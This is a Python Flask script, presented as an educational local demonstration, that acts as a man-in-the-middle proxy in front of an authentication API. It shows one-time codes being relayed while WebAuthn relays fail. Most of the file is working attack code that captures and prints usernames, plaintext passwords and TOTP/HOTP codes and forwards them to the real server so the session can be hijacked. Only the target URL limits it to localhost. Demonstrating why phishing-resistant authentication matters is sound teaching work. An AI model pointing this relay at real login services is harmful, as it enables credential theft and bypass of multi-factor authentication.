"""
MITM Relay Demonstration (Local Only - Educational)
Demonstrates how OTP can be relayed but WebAuthn prevents MITM attacks
Shows origin/RP-ID binding protection in FIDO2/WebAuthn

WARNING: For educational use only in controlled environments
"""

import time
import json
import requests
from datetime import datetime
from flask import Flask, request, jsonify, Response
import threading

app = Flask(__name__)

# Configuration
REAL_API_URL = "http://localhost:5000"
PROXY_PORT = 5001

# Logs for demonstration
captured_credentials = []
relay_logs = []

class RelayLog:
    def __init__(self):
        self.timestamp = datetime.now()
        self.endpoint = ""
        self.request_data = {}
        self.response_data = {}
        self.relay_success = False
        self.relay_latency = 0
        self.notes = ""

    def to_dict(self):
        return {
            'timestamp': self.timestamp.isoformat(),
            'endpoint': self.endpoint,
            'request_data': self.request_data,
            'response_data': self.response_data,
            'relay_success': self.relay_success,
            'relay_latency_ms': self.relay_latency,
            'notes': self.notes
        }

def log_credentials(endpoint, data):
    """Log captured credentials"""
    entry = {
        'timestamp': datetime.now().isoformat(),
        'endpoint': endpoint,
        'username': data.get('username'),
        'password': data.get('password', '***'),
        'code': data.get('code'),
        'mfa_type': 'TOTP/HOTP' if 'code' in data else 'Password'
    }
    captured_credentials.append(entry)

    print("\n" + "="*60)
    print("[MITM] CREDENTIALS CAPTURED")
    print("="*60)
    print(f"Time: {entry['timestamp']}")
    print(f"Endpoint: {endpoint}")
    print(f"Username: {entry['username']}")
    if 'password' in data:
        print(f"Password: {data['password']}")
    if 'code' in data:
        print(f"OTP Code: {data['code']}")
    print("="*60)

def relay_request(endpoint, method='POST', data=None, headers=None):
    """
    Relay request to real API and measure latency
    """
    log = RelayLog()
    log.endpoint = endpoint
    log.request_data = data

    url = f"{REAL_API_URL}{endpoint}"

    start_time = time.time()

    try:
        if method == 'POST':
            response = requests.post(url, json=data, headers=headers or {})
        elif method == 'GET':
            response = requests.get(url, params=data, headers=headers or {})
        else:
            response = requests.request(method, url, json=data, headers=headers or {})

        relay_time = (time.time() - start_time) * 1000  # milliseconds
        log.relay_latency = relay_time
        log.relay_success = response.status_code < 400

        try:
            log.response_data = response.json()
        except:
            log.response_data = {'text': response.text}

        relay_logs.append(log)

        print(f"\n[MITM] Relayed to {endpoint}")
        print(f"       Status: {response.status_code}")
        print(f"       Latency: {relay_time:.2f}ms")
        print(f"       Success: {log.relay_success}")

        return response

    except Exception as e:
        log.relay_success = False
        log.notes = f"Error: {str(e)}"
        relay_logs.append(log)

        print(f"\n[MITM] Relay failed: {e}")
        return None

@app.route('/register', methods=['POST'])
def proxy_register():
    """Intercept registration"""
    data = request.json
    print(f"\n[MITM] Intercepted /register")

    # Capture credentials
    log_credentials('/register', data)

    # Relay to real API
    response = relay_request('/register', 'POST', data)

    if response:
        return Response(response.content, status=response.status_code,
                       content_type=response.headers.get('content-type'))
    else:
        return jsonify({'error': 'Relay failed'}), 500

@app.route('/login', methods=['POST'])
def proxy_login():
    """Intercept login"""
    data = request.json
    print(f"\n[MITM] Intercepted /login")

    # Capture credentials
    log_credentials('/login', data)

    # Relay to real API
    response = relay_request('/login', 'POST', data)

    if response:
        return Response(response.content, status=response.status_code,
                       content_type=response.headers.get('content-type'))
    else:
        return jsonify({'error': 'Relay failed'}), 500

@app.route('/mfa/totp/verify', methods=['POST'])
def proxy_totp_verify():
    """Intercept TOTP verification - VULNERABLE TO RELAY"""
    data = request.json
    print(f"\n[MITM] Intercepted /mfa/totp/verify")
    print("[MITM] TOTP IS VULNERABLE TO RELAY ATTACK")

    # Capture OTP code
    log_credentials('/mfa/totp/verify', data)

    # Relay to real API with timing
    start = time.time()
    response = relay_request('/mfa/totp/verify', 'POST', data)
    relay_latency = (time.time() - start) * 1000

    if response and response.status_code == 200:
        print(f"[MITM] SUCCESS! TOTP code accepted (latency: {relay_latency:.2f}ms)")
        print("[MITM] Attacker can now use this session!")
    else:
        print(f"[MITM] TOTP relay failed (possibly expired)")

    if response:
        return Response(response.content, status=response.status_code,
                       content_type=response.headers.get('content-type'))
    else:
        return jsonify({'error': 'Relay failed'}), 500

@app.route('/mfa/hotp/verify', methods=['POST'])
def proxy_hotp_verify():
    """Intercept HOTP verification - VULNERABLE TO RELAY"""
    data = request.json
    print(f"\n[MITM] Intercepted /mfa/hotp/verify")
    print("[MITM] HOTP IS VULNERABLE TO RELAY ATTACK")

    # Capture OTP code
    log_credentials('/mfa/hotp/verify', data)

    # Relay to real API
    response = relay_request('/mfa/hotp/verify', 'POST', data)

    if response and response.status_code == 200:
        print(f"[MITM] SUCCESS! HOTP code accepted")
        print("[MITM] Attacker can now use this session!")
    else:
        print(f"[MITM] HOTP relay failed")

    if response:
        return Response(response.content, status=response.status_code,
                       content_type=response.headers.get('content-type'))
    else:
        return jsonify({'error': 'Relay failed'}), 500

@app.route('/mfa/webauthn/authenticate/begin', methods=['POST'])
def proxy_webauthn_begin():
    """Intercept WebAuthn begin - attacker tries to relay"""
    data = request.json
    print(f"\n[MITM] Intercepted /mfa/webauthn/authenticate/begin")
    print("[MITM] Attempting to relay WebAuthn challenge...")

    # Relay to real API
    response = relay_request('/mfa/webauthn/authenticate/begin', 'POST', data)

    if response:
        return Response(response.content, status=response.status_code,
                       content_type=response.headers.get('content-type'))
    else:
        return jsonify({'error': 'Relay failed'}), 500

@app.route('/mfa/webauthn/authenticate/complete', methods=['POST'])
def proxy_webauthn_complete():
    """
    Intercept WebAuthn complete - THIS WILL FAIL
    WebAuthn binds to origin, so relay attack is prevented
    """
    data = request.json
    print(f"\n[MITM] Intercepted /mfa/webauthn/authenticate/complete")
    print("[MITM] Attempting to relay WebAuthn response...")

    # Try to relay to real API
    response = relay_request('/mfa/webauthn/authenticate/complete', 'POST', data)

    if response and response.status_code == 200:
        print(f"[MITM] WARNING: WebAuthn relay succeeded (unexpected!)")
    else:
        print(f"[MITM] FAILED: WebAuthn relay blocked!")
        print("[MITM] This is EXPECTED - WebAuthn prevents MITM attacks")
        print("[MITM] Reason: Origin/RP-ID binding mismatch")
        print("[MITM] The signature is bound to the legitimate domain")

    if response:
        return Response(response.content, status=response.status_code,
                       content_type=response.headers.get('content-type'))
    else:
        return jsonify({'error': 'Relay failed'}), 500

@app.route('/mitm/logs', methods=['GET'])
def get_mitm_logs():
    """Get MITM relay logs"""
    return jsonify({
        'captured_credentials': captured_credentials,
        'relay_logs': [log.to_dict() for log in relay_logs],
        'total_captured': len(captured_credentials),
        'total_relays': len(relay_logs),
        'successful_relays': sum(1 for log in relay_logs if log.relay_success)
    }), 200

@app.route('/mitm/stats', methods=['GET'])
def get_stats():
    """Get MITM statistics"""
    otp_relays = [log for log in relay_logs if 'totp' in log.endpoint or 'hotp' in log.endpoint]
    webauthn_relays = [log for log in relay_logs if 'webauthn' in log.endpoint]

    otp_success = sum(1 for log in otp_relays if log.relay_success)
    webauthn_success = sum(1 for log in webauthn_relays if log.relay_success)

    avg_otp_latency = sum(log.relay_latency for log in otp_relays) / len(otp_relays) if otp_relays else 0
    avg_webauthn_latency = sum(log.relay_latency for log in webauthn_relays) / len(webauthn_relays) if webauthn_relays else 0

    return jsonify({
        'summary': {
            'total_credentials_captured': len(captured_credentials),
            'total_relay_attempts': len(relay_logs),
            'otp_relay_attempts': len(otp_relays),
            'otp_relay_success_rate': f"{(otp_success/len(otp_relays)*100) if otp_relays else 0:.1f}%",
            'webauthn_relay_attempts': len(webauthn_relays),
            'webauthn_relay_success_rate': f"{(webauthn_success/len(webauthn_relays)*100) if webauthn_relays else 0:.1f}%",
            'avg_otp_latency_ms': avg_otp_latency,
            'avg_webauthn_latency_ms': avg_webauthn_latency
        },
        'analysis': {
            'otp_vulnerable': otp_success > 0,
            'webauthn_secure': webauthn_success == 0 and len(webauthn_relays) > 0,
            'conclusion': 'WebAuthn prevents MITM attacks via origin binding, while OTP is vulnerable to relay attacks'
        }
    }), 200

@app.route('/mitm/reset', methods=['POST'])
def reset_logs():
    """Reset MITM logs"""
    global captured_credentials, relay_logs
    captured_credentials = []
    relay_logs = []
    return jsonify({'message': 'Logs reset'}), 200

@app.route('/mitm/demo', methods=['GET'])
def demo_page():
    """Demo page explaining the MITM demonstration"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>MITM Relay Demo</title>
        <style>
            body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }
            .container { max-width: 800px; margin: 0 auto; }
            .box { background: #2d2d2d; padding: 20px; margin: 20px 0; border-radius: 5px; }
            .success { color: #4ec9b0; }
            .failure { color: #f48771; }
            .warning { color: #dcdcaa; }
            h1, h2 { color: #569cd6; }
            code { background: #1e1e1e; padding: 2px 6px; border-radius: 3px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>MITM Relay Attack Demonstration</h1>

            <div class="box">
                <h2>What is this?</h2>
                <p>This is a Man-in-the-Middle (MITM) proxy that intercepts authentication requests
                   between client and server. It demonstrates:</p>
                <ul>
                    <li><span class="failure">OTP (TOTP/HOTP) is vulnerable to relay attacks</span></li>
                    <li><span class="success">WebAuthn prevents relay attacks via origin binding</span></li>
                </ul>
            </div>

            <div class="box">
                <h2>How it works</h2>
                <ol>
                    <li>Client connects to proxy at <code>localhost:5001</code></li>
                    <li>Proxy intercepts and logs credentials + OTP codes</li>
                    <li>Proxy relays request to real API at <code>localhost:5000</code></li>
                    <li>Proxy returns response to client</li>
                </ol>
            </div>

            <div class="box">
                <h2>Why OTP fails</h2>
                <p class="failure">OTP codes (TOTP/HOTP) are just numbers that can be relayed:</p>
                <ul>
                    <li>Victim enters code → MITM captures it → MITM uses it immediately</li>
                    <li>Even with 30-second TOTP window, relay is fast enough</li>
                    <li>HOTP is even worse (no time limit)</li>
                </ul>
            </div>

            <div class="box">
                <h2>Why WebAuthn succeeds</h2>
                <p class="success">WebAuthn prevents MITM via cryptographic origin binding:</p>
                <ul>
                    <li>Challenge includes origin/RP-ID from legitimate server</li>
                    <li>Browser signs with private key, binding to origin</li>
                    <li>Signature verification fails if origin doesn't match</li>
                    <li>MITM cannot forge signature without private key</li>
                </ul>
            </div>

            <div class="box">
                <h2>API Endpoints</h2>
                <ul>
                    <li><code>GET /mitm/logs</code> - View captured credentials and relay logs</li>
                    <li><code>GET /mitm/stats</code> - View statistics and analysis</li>
                    <li><code>POST /mitm/reset</code> - Reset logs</li>
                </ul>
            </div>

            <div class="box warning">
                <h2>⚠️ Educational Use Only</h2>
                <p>This tool is for controlled educational demonstrations only.
                   Running MITM attacks against systems you don't own is illegal.</p>
            </div>
        </div>
    </body>
    </html>
    """
    return html

if __name__ == '__main__':
    print("="*60)
    print("MITM RELAY PROXY - Educational Demonstration")
    print("="*60)
    print(f"\nStarting proxy on port {PROXY_PORT}")
    print(f"Real API: {REAL_API_URL}")
    print(f"\nPoint clients to: http://localhost:{PROXY_PORT}")
    print(f"Demo page: http://localhost:{PROXY_PORT}/mitm/demo")
    print(f"View logs: http://localhost:{PROXY_PORT}/mitm/logs")
    print(f"View stats: http://localhost:{PROXY_PORT}/mitm/stats")
    print("\n" + "="*60)

    app.run(debug=True, host='0.0.0.0', port=PROXY_PORT, use_reloader=False)
